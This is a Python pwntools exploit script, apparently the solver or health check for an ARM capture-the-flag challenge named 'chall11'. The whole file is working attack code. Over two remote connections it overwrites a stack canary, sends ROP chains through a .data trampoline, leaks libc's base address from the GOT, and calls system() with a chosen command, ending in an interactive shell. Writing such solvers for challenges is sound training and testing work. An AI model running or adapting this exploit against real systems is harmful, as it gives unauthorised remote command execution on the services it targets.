#!/usr/bin/env python3
from pwn import *
import sys

HOST = ''
PORT = 40011

NUM_ATTEMPTS = 10

CMD  = 'id'

context(os='linux', arch='arm')

target_elf = ELF('../bin/chall11')

if len(sys.argv) > 1:
    target_libc = ELF('../bin/libc.so.6')
    HOST  = sys.argv[1]
else:
    target_libc = target_elf.libc

if len(sys.argv) > 2:
    PORT = sys.argv[2]

if len(sys.argv) > 3:
    CMD = sys.argv[3]


def exploit_attempt():
    io = None
    try:
        if len(HOST) > 0:
            io = remote(HOST, PORT, level='warn')
            target_libc = ELF('../bin/libc.so.6')
        else:
            raise ValueError("This exploit is not configured to run locally. Please provide HOST and PORT")

        SYST = target_libc.symbols['system'] # system() THUMB
        LIBC = target_libc.symbols['memset']

        # Note: This exploit will take advantage of the fact the vulnerable
        #       application is run in qemu-user, which has known limitations.
        #       There are several ways to complete this challenge without
        #       using these factors, but since the path of least resistence
        #       is the most attractive, this exploit will run over two runs
        #       to confirm the base address of libc. It makes the code longer
        #       than it needs to be.

        # RUN 1: Leaking libc base address


        sys.stdout.write(io.recvuntil('Sum')[:-10])
        io.recvline()

        # step 1: fill the buffer to eat up some stack
        for i in range(16):
            io.recvuntil(b'<< ')
            io.sendline(b'1')

        # step 2: overwrite the stack canary on the stack
        io.recvuntil(b'<< ')
        io.sendline(b'0')

        # step 3: write rop chain to bounce to trampoline where
        #         there is a gadget to populate registers
        rop = [
            0x00000002,  # lr => junk
            target_elf.bss(4),  # pc => .data trampoline

            0x00000001,  # r0 => stdout
            target_elf.symbols['got.memset'],  # r1 => memset@GOT
            0x00000010,  # r2 => length
            0x10688,     # pc => bl write()

        ]

        for addr in rop:
            if addr > 0x7fffffff:
                addr = 0-(0x100000000 - addr)

            io.recvuntil(b'<< ')
            io.sendline(str(addr).encode('ascii'))

        # step 4: write trampoline gadget in .data
        io.recvuntil(b'<< ')
        io.sendline(asm('pop {r0,r1,r2,pc}'))

        # step 5: close the write end of the socket to get EOF from read()
        #         which causes an out of bounds NULL write over the stack
        #         canary stored in .bss
        io.shutdown('send')

        # step 6: collect the leak
        io.recvuntil(b'<< ')
        leak = io.recvline().strip()[:4]
        leak = u32(leak)
        libc = leak - LIBC

        log.info('Leak: 0x%08x' % leak)
        log.info('Libc: 0x%08x' % libc)

        io.close()

        # RUN 2: Run arbitrary command

        io = remote(HOST, PORT, level='warn')

        io.recvuntil(b'Sum')
        io.recvline()

        # step 1: fill the buffer to eat up some stack
        for i in range(16):
            io.recvuntil(b'<< ')
            io.sendline(b'1')

        # step 2: overwrite the stack canary on the stack
        io.recvuntil(b'<< ')
        io.sendline(b'0')

        # step 3: write rop chain
        rop = [
            0x00000002,  # lr
            target_elf.bss(4),  # pc => .data trampoline

            target_elf.bss(12),   # r0 => command string
            libc+SYST,  # pc => system()
        ]

        for addr in rop:
            if addr > 0x7fffffff:
                addr = 0-(0x100000000 - addr)

            io.recvuntil(b'<< ')
            io.sendline(str(addr))

        # step 4: write trampoline gadget and command
        pay  = asm('pop {r0,pc}')  # pop {r0,pc} 
        pay += (CMD+'\n').encode('ascii')

        io.recvuntil('<< ')
        io.sendline(pay)

        # step 5: close the write end of the socket to get EOF from read()
        #         which causes an out of bounds NULL write over the stack
        #         canary stored in .bss
        io.shutdown('send')

        # done
        id_result = io.recvall()
        if b'uid=' in id_result:
            log.success('shell: %s', id_result.decode('ascii').strip())
            if not os.environ.get('HEALTH_CHECK', False):
                io.interactive()
            return True
        else:
            log.failure('Error: %s', id_result)
    except EOFError as e:
        log.failure('Fail: EOF')
    except Exception as e:
        log.failure('Error: %s: %s', type(e), str(e))
    finally:
        if io:
            io.close()
    return False

if __name__ == '__main__':
    for _ in range(NUM_ATTEMPTS):
        if exploit_attempt():
            sys.exit(0)
        sleep(0.1)
    sys.exit(1)

